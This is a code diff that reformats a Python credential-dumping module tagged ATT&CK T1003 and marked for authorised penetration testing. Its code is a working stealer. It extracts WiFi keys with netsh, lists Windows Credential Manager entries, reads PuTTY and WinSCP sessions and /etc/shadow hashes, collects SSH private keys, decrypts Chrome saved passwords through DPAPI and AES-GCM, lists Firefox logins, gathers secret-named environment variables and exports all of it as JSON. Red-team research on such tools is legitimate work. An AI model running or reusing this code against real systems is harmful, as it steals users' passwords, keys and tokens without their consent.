@@ -10,37 +10,41 @@ ATT&CK Technique: T1003 - OS Credential Dumping
 
 注意: 仅用于授权的渗透测试和安全研究
 """
+
 import logging
 
 logger = logging.getLogger(__name__)
 
-import os
-import re
-import sys
-import json
 import base64
-import sqlite3
+import json
+import os
 import platform
+import re
+import sqlite3
+import sys
 import tempfile
-from pathlib import Path
-from typing import Dict, List, Optional, Any
 from dataclasses import dataclass, field
-from enum import Enum
 from datetime import datetime
+from enum import Enum
+from pathlib import Path
+from typing import Any, Dict, List, Optional
 
 # 条件导入
 try:
     import winreg
+
     HAS_WINREG = True
 except ImportError:
     HAS_WINREG = False
 
 try:
     from Cryptodome.Cipher import AES
+
     HAS_CRYPTO = True
 except ImportError:
     try:
         from Crypto.Cipher import AES
+
         HAS_CRYPTO = True
     except ImportError:
         HAS_CRYPTO = False
@@ -48,6 +52,7 @@ except ImportError:
 
 class CredentialType(Enum):
     """凭证类型"""
+
     PASSWORD = "password"
     HASH = "hash"
     TOKEN = "token"
@@ -64,6 +69,7 @@ class CredentialType(Enum):
 @dataclass
 class Credential:
     """凭证数据结构"""
+
     cred_type: CredentialType
     source: str
     username: str = ""
@@ -79,18 +85,21 @@ class Credential:
             "type": self.cred_type.value,
             "source": self.source,
             "username": self.username,
-            "password": self.password if len(self.password) < 100 else f"{self.password[:50]}...[TRUNCATED]",
+            "password": (
+                self.password if len(self.password) < 100 else f"{self.password[:50]}...[TRUNCATED]"
+            ),
             "domain": self.domain,
             "host": self.host,
             "url": self.url,
             "extra": self.extra,
-            "timestamp": self.timestamp
+            "timestamp": self.timestamp,
         }
 
 
 @dataclass
 class DumpResult:
     """提取结果"""
+
     success: bool
     source: str
     credentials: List[Credential] = field(default_factory=list)
@@ -102,7 +111,7 @@ class DumpResult:
             "source": self.source,
             "count": len(self.credentials),
             "credentials": [c.to_dict() for c in self.credentials],
-            "error": self.error
+            "error": self.error,
         }
 
 
@@ -139,13 +148,15 @@ class CredentialDumper:
 
             # 获取WiFi配置列表
             result = subprocess.run(
-                ["netsh", "wlan", "show", "profiles"],
-                capture_output=True, text=True, timeout=30
+                ["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=30
             )
 
             # 解析配置名称
-            profiles = re.findall(r"所有用户配置文件\s*:\s*(.+)|All User Profile\s*:\s*(.+)",
-                                 result.stdout, re.IGNORECASE)
+            profiles = re.findall(
+                r"所有用户配置文件\s*:\s*(.+)|All User Profile\s*:\s*(.+)",
+                result.stdout,
+                re.IGNORECASE,
+            )
 
             for profile_match in profiles:
                 profile = profile_match[0] or profile_match[1]
@@ -157,13 +168,14 @@ class CredentialDumper:
                 try:
                     detail = subprocess.run(
                         ["netsh", "wlan", "show", "profile", profile, "key=clear"],
-                        capture_output=True, text=True, timeout=30
+                        capture_output=True,
+                        text=True,
+                        timeout=30,
                     )
 
                     # 提取密码
                     key_match = re.search(
-                        r"关键内容\s*:\s*(.+)|Key Content\s*:\s*(.+)",
-                        detail.stdout, re.IGNORECASE
+                        r"关键内容\s*:\s*(.+)|Key Content\s*:\s*(.+)", detail.stdout, re.IGNORECASE
                     )
 
                     if key_match:
@@ -173,7 +185,7 @@ class CredentialDumper:
                             source="Windows WiFi",
                             username=profile,
                             password=password,
-                            extra={"security_type": "WPA/WPA2"}
+                            extra={"security_type": "WPA/WPA2"},
                         )
                         credentials.append(cred)
                         self._log(f"Found WiFi: {profile}")
@@ -198,16 +210,13 @@ class CredentialDumper:
             import subprocess
 
             # 使用cmdkey列出凭据
-            result = subprocess.run(
-                ["cmdkey", "/list"],
-                capture_output=True, text=True, timeout=30
-            )
+            result = subprocess.run(["cmdkey", "/list"], capture_output=True, text=True, timeout=30)
 
             # 解析凭据
             current_target = None
             current_user = None
 
-            for line in result.stdout.split('\n'):
+            for line in result.stdout.split("\n"):
                 line = line.strip()
 
                 target_match = re.search(r"目标:\s*(.+)|Target:\s*(.+)", line, re.IGNORECASE)
@@ -224,7 +233,7 @@ class CredentialDumper:
                         source="Windows Credential Manager",
                         username=current_user,
                         host=current_target,
-                        extra={"note": "密码需要DPAPI解密或mimikatz提取"}
+                        extra={"note": "密码需要DPAPI解密或mimikatz提取"},
                     )
                     credentials.append(cred)
                     self._log(f"Found credential: {current_user}@{current_target}")
@@ -249,8 +258,7 @@ class CredentialDumper:
         # PuTTY Sessions
         try:
             putty_key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\SimonTatham\PuTTY\Sessions"
+                winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions"
             )
 
             i = 0
@@ -273,7 +281,7 @@ class CredentialDumper:
                             source="PuTTY",
                             username=user,
                             host=host,
-                            extra={"session": session_name}
+                            extra={"session": session_name},
                         )
                         credentials.append(cred)
                         self._log(f"Found PuTTY session: {session_name}")
@@ -290,8 +298,7 @@ class CredentialDumper:
         # WinSCP
         try:
             winscp_key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Martin Prikryl\WinSCP 2\Sessions"
+                winreg.HKEY_CURRENT_USER, r"Software\Martin Prikryl\WinSCP 2\Sessions"
             )
 
             i = 0
@@ -317,7 +324,7 @@ class CredentialDumper:
                             username=user,
                             password=password if password else "[encrypted]",
                             host=host,
-                            extra={"session": session_name, "encrypted": bool(password)}
+                            extra={"session": session_name, "encrypted": bool(password)},
                         )
                         credentials.append(cred)
                         self._log(f"Found WinSCP session: {session_name}")
@@ -346,10 +353,10 @@ class CredentialDumper:
         shadow_path = "/etc/shadow"
 
         try:
-            with open(shadow_path, 'r', encoding='utf-8', errors='replace') as f:
+            with open(shadow_path, "r", encoding="utf-8", errors="replace") as f:
                 for line in f:
-                    parts = line.strip().split(':')
-                    if len(parts) >= 2 and parts[1] and parts[1] not in ['*', '!', '!!']:
+                    parts = line.strip().split(":")
+                    if len(parts) >= 2 and parts[1] and parts[1] not in ["*", "!", "!!"]:
                         cred = Credential(
                             cred_type=CredentialType.HASH,
                             source="/etc/shadow",
@@ -357,8 +364,8 @@ class CredentialDumper:
                             password=parts[1],
                             extra={
                                 "hash_type": self._identify_hash_type(parts[1]),
-                                "last_change": parts[2] if len(parts) > 2 else ""
-                            }
+                                "last_change": parts[2] if len(parts) > 2 else "",
+                            },
                         )
                         credentials.append(cred)
                         self._log(f"Found shadow entry: {parts[0]}")
@@ -372,15 +379,15 @@ class CredentialDumper:
 
     def _identify_hash_type(self, hash_str: str) -> str:
         """识别hash类型"""
-        if hash_str.startswith('$1$'):
+        if hash_str.startswith("$1$"):
             return "MD5"
-        elif hash_str.startswith('$5$'):
+        elif hash_str.startswith("$5$"):
             return "SHA-256"
-        elif hash_str.startswith('$6$'):
+        elif hash_str.startswith("$6$"):
             return "SHA-512"
-        elif hash_str.startswith('$y$'):
+        elif hash_str.startswith("$y$"):
             return "yescrypt"
-        elif hash_str.startswith('$2'):
+        elif hash_str.startswith("$2"):
             return "bcrypt"
         return "unknown"
 
@@ -421,15 +428,14 @@ class CredentialDumper:
 
                     # 检查是否为私钥
                     is_key = any(
-                        item == pattern or
-                        (pattern.startswith("*") and item.endswith(pattern[1:]))
+                        item == pattern or (pattern.startswith("*") and item.endswith(pattern[1:]))
                         for pattern in key_patterns
                     )
 
                     if not is_key and not item.endswith(".pub"):
                         # 检查文件内容
                         try:
-                            with open(item_path, 'r', encoding='utf-8', errors='replace') as f:
+                            with open(item_path, "r", encoding="utf-8", errors="replace") as f:
                                 first_line = f.readline()
                                 if "PRIVATE KEY" in first_line:
                                     is_key = True
@@ -438,7 +444,7 @@ class CredentialDumper:
 
                     if is_key:
                         try:
-                            with open(item_path, 'r', encoding='utf-8', errors='replace') as f:
+                            with open(item_path, "r", encoding="utf-8", errors="replace") as f:
                                 content = f.read()
 
                             # 检查是否加密
@@ -451,8 +457,8 @@ class CredentialDumper:
                                 password=content[:500] + "..." if len(content) > 500 else content,
                                 extra={
                                     "encrypted": is_encrypted,
-                                    "key_type": self._identify_key_type(content)
-                                }
+                                    "key_type": self._identify_key_type(content),
+                                },
                             )
                             credentials.append(cred)
                             self._log(f"Found SSH key: {item_path}")
@@ -488,13 +494,10 @@ class CredentialDumper:
         # Chrome配置文件路径
         if self.os_type == "windows":
             base_path = os.path.join(
-                os.environ.get("LOCALAPPDATA", ""),
-                "Google", "Chrome", "User Data"
+                os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"
             )
         elif self.os_type == "darwin":
-            base_path = os.path.expanduser(
-                "~/Library/Application Support/Google/Chrome"
-            )
+            base_path = os.path.expanduser("~/Library/Application Support/Google/Chrome")
         else:
             base_path = os.path.expanduser("~/.config/google-chrome")
 
@@ -512,6 +515,7 @@ class CredentialDumper:
                 # 复制数据库 (Chrome可能锁定原文件)
                 temp_db = os.path.join(tempfile.gettempdir(), f"chrome_login_{os.getpid()}.db")
                 import shutil
+
                 shutil.copy2(db_path, temp_db)
 
                 conn = sqlite3.connect(temp_db)
@@ -539,7 +543,7 @@ class CredentialDumper:
                         username=username,
                         password=password,
                         url=url,
-                        extra={"profile": os.path.dirname(db_path)}
+                        extra={"profile": os.path.dirname(db_path)},
                     )
                     credentials.append(cred)
                     self._log(f"Found Chrome password: {username}@{url}")
@@ -565,13 +569,11 @@ class CredentialDumper:
             if not os.path.exists(local_state_path):
                 return "[encrypted]"
 
-            with open(local_state_path, 'r', encoding='utf-8') as f:
+            with open(local_state_path, "r", encoding="utf-8") as f:
                 local_state = json.load(f)
 
             # 获取加密密钥
-            encrypted_key = base64.b64decode(
-                local_state['os_crypt']['encrypted_key']
-            )
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
 
             # 移除 'DPAPI' 前缀
             encrypted_key = encrypted_key[5:]
@@ -582,25 +584,20 @@ class CredentialDumper:
 
             class DATA_BLOB(ctypes.Structure):
                 _fields_ = [
-                    ('cbData', ctypes.wintypes.DWORD),
-                    ('pbData', ctypes.POINTER(ctypes.c_char))
+                    ("cbData", ctypes.wintypes.DWORD),
+                    ("pbData", ctypes.POINTER(ctypes.c_char)),
                 ]
 
             def decrypt_dpapi(encrypted_data):
                 input_blob = DATA_BLOB(
-                    len(encrypted_data),
-                    ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_char))
+                    len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_char))
                 )
                 output_blob = DATA_BLOB()
 
                 if ctypes.windll.crypt32.CryptUnprotectData(
-                    ctypes.byref(input_blob),
-                    None, None, None, None, 0,
-                    ctypes.byref(output_blob)
+                    ctypes.byref(input_blob), None, None, None, None, 0, ctypes.byref(output_blob)
                 ):
-                    decrypted = ctypes.string_at(
-                        output_blob.pbData, output_blob.cbData
-                    )
+                    decrypted = ctypes.string_at(output_blob.pbData, output_blob.cbData)
                     ctypes.windll.kernel32.LocalFree(output_blob.pbData)
                     return decrypted
                 return None
@@ -613,18 +610,18 @@ class CredentialDumper:
             # 解密密码
             # Chrome 使用 AES-256-GCM
             # 格式: 'v10' + nonce(12) + ciphertext + tag(16)
-            if encrypted[:3] == b'v10':
+            if encrypted[:3] == b"v10":
                 nonce = encrypted[3:15]
                 ciphertext = encrypted[15:-16]
                 tag = encrypted[-16:]
 
                 cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                 decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-                return decrypted.decode('utf-8')
+                return decrypted.decode("utf-8")
             else:
                 # 旧版本直接使用 DPAPI
                 result = decrypt_dpapi(encrypted)
-                return result.decode('utf-8') if result else "[decrypt failed]"
+                return result.decode("utf-8") if result else "[decrypt failed]"
 
         except Exception as e:
             return f"[decrypt error: {str(e)[:50]}]"
@@ -639,13 +636,10 @@ class CredentialDumper:
         # Firefox配置文件路径
         if self.os_type == "windows":
             base_path = os.path.join(
-                os.environ.get("APPDATA", ""),
-                "Mozilla", "Firefox", "Profiles"
+                os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles"
             )
         elif self.os_type == "darwin":
-            base_path = os.path.expanduser(
-                "~/Library/Application Support/Firefox/Profiles"
-            )
+            base_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
         else:
             base_path = os.path.expanduser("~/.mozilla/firefox")
 
@@ -661,21 +655,21 @@ class CredentialDumper:
                 continue
 
             try:
-                with open(logins_path, 'r', encoding='utf-8') as f:
+                with open(logins_path, "r", encoding="utf-8") as f:
                     logins_data = json.load(f)
 
-                for login in logins_data.get('logins', []):
+                for login in logins_data.get("logins", []):
                     cred = Credential(
                         cred_type=CredentialType.BROWSER,
                         source="Firefox",
-                        username=login.get('encryptedUsername', '[encrypted]'),
+                        username=login.get("encryptedUsername", "[encrypted]"),
                         password="[NSS encrypted - use firefox_decrypt tool]",
-                        url=login.get('hostname', ''),
+                        url=login.get("hostname", ""),
                         extra={
                             "profile": profile,
-                            "guid": login.get('guid', ''),
-                            "note": "使用 firefox_decrypt 或 firepwd 解密"
-                        }
+                            "guid": login.get("guid", ""),
+                            "note": "使用 firefox_decrypt 或 firepwd 解密",
+                        },
                     )
                     credentials.append(cred)
                     self._log(f"Found Firefox login: {login.get('hostname', '')}")
@@ -696,24 +690,41 @@ class CredentialDumper:
 
         # 敏感环境变量关键字
         sensitive_keywords = [
-            'PASSWORD', 'PASSWD', 'PWD', 'SECRET', 'TOKEN',
-            'API_KEY', 'APIKEY', 'AUTH', 'CREDENTIAL',
-            'AWS_', 'AZURE_', 'GCP_', 'GITHUB_', 'GITLAB_',
-            'DATABASE_URL', 'DB_', 'MONGO', 'REDIS', 'MYSQL',
-            'PRIVATE_KEY', 'SSH_', 'GPG_'
+            "PASSWORD",
+            "PASSWD",
+            "PWD",
+            "SECRET",
+            "TOKEN",
+            "API_KEY",
+            "APIKEY",
+            "AUTH",
+            "CREDENTIAL",
+            "AWS_",
+            "AZURE_",
+            "GCP_",
+            "GITHUB_",
+            "GITLAB_",
+            "DATABASE_URL",
+            "DB_",
+            "MONGO",
+            "REDIS",
+            "MYSQL",
+            "PRIVATE_KEY",
+            "SSH_",
+            "GPG_",
         ]
 
         for key, value in os.environ.items():
             for keyword in sensitive_keywords:
                 if keyword in key.upper():
                     # 过滤明显不是凭证的值
-                    if value and len(value) > 3 and not value.startswith('/'):
+                    if value and len(value) > 3 and not value.startswith("/"):
                         cred = Credential(
                             cred_type=CredentialType.API_KEY,
                             source="Environment Variable",
                             username=key,
                             password=value[:100] + "..." if len(value) > 100 else value,
-                            extra={"full_length": len(value)}
+                            extra={"full_length": len(value)},
                         )
                         credentials.append(cred)
                         self._log(f"Found env secret: {key}")
@@ -734,14 +745,14 @@ class CredentialDumper:
         results = {}
 
         all_methods = {
-            'wifi': self.dump_windows_wifi,
-            'vault': self.dump_windows_vault,
-            'registry': self.dump_windows_registry_secrets,
-            'shadow': self.dump_linux_shadow,
-            'ssh': self.dump_ssh_keys,
-            'chrome': self.dump_chrome_passwords,
-            'firefox': self.dump_firefox_passwords,
-            'env': self.dump_environment_secrets,
+            "wifi": self.dump_windows_wifi,
+            "vault": self.dump_windows_vault,
+            "registry": self.dump_windows_registry_secrets,
+            "shadow": self.dump_linux_shadow,
+            "ssh": self.dump_ssh_keys,
+            "chrome": self.dump_chrome_passwords,
+            "firefox": self.dump_firefox_passwords,
+            "env": self.dump_environment_secrets,
         }
 
         # 选择要执行的方法
@@ -770,11 +781,11 @@ class CredentialDumper:
             "host": platform.node(),
             "os": self.os_type,
             "total": len(self.credentials),
-            "credentials": [c.to_dict() for c in self.credentials]
+            "credentials": [c.to_dict() for c in self.credentials],
         }
 
         if output_path:
-            with open(output_path, 'w', encoding='utf-8') as f:
+            with open(output_path, "w", encoding="utf-8") as f:
                 json.dump(data, f, indent=2, ensure_ascii=False)
             return output_path
         else:
@@ -798,18 +809,18 @@ def dump_credentials(categories: List[str] = None, verbose: bool = False) -> Dic
 
     return {
         "total_credentials": len(dumper.credentials),
-        "results": {k: v.to_dict() for k, v in results.items()}
+        "results": {k: v.to_dict() for k, v in results.items()},
     }
 
 
 if __name__ == "__main__":
     # 测试
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
     logger.info("=== Credential Dumper Test ===")
     dumper = CredentialDumper(verbose=True)
 
     # 只测试安全的提取方法
-    results = dumper.dump_all(['env', 'ssh'])
+    results = dumper.dump_all(["env", "ssh"])
 
     logger.info(f"Total credentials found: {len(dumper.credentials)}")
     logger.info(dumper.export_json())
